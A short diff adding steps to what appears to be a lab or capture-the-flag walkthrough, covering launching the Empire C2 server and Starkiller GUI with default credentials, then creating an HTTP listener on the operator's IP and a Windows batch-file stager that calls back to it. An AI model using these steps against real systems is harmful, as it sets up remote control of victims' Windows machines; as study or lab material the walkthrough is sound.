@@ -70,3 +70,21 @@ chmod +x starkiller.AppImage
 ```
 
 now lets start both Empire and Starkiller
+```bash
+./ps-empire server
+./starkiller.AppImage
+URL: localhost:1337
+User: empireadmin
+Pass: password123
+```
+
+in Starkiller, lets create a listener
++ create listener
++ type: http
++ host: myMachineIP
++ port: myMachinePort
+
+lets also create a stager
++ create stager
++ type: windows/launcher_bat
++ listener: oneMadeFromAbove
